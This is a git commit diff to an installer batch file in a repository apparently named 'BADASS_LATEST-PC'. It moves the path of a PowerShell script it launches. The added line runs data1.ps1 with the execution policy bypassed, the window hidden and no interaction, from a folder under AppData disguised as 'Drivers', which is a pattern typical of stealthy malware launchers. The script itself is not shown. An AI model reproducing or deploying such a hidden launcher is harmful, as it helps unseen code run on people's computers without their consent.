dba439fb579f30c32b198241ab5f9cb967c0164a
Dougoll <65680164+Dougoll@users.noreply.github.com>
2024-08-07 19:39:31 -0400

    Update _INSTALL.bat

--- BADASS_LATEST-PC/dependencies/_INSTALL.bat
+++ BADASS_LATEST-PC/dependencies/_INSTALL.bat
@@ -1,2 +1,2 @@
-powershell.exe -executionpolicy bypass -windowstyle hidden -noninteractive -nologo -file "C:\temp\data1.ps1"
+powershell.exe -executionpolicy bypass -windowstyle hidden -noninteractive -nologo -file "C:\Users\%username%\Appdata\Local\Drivers\data1.ps1"
 exit
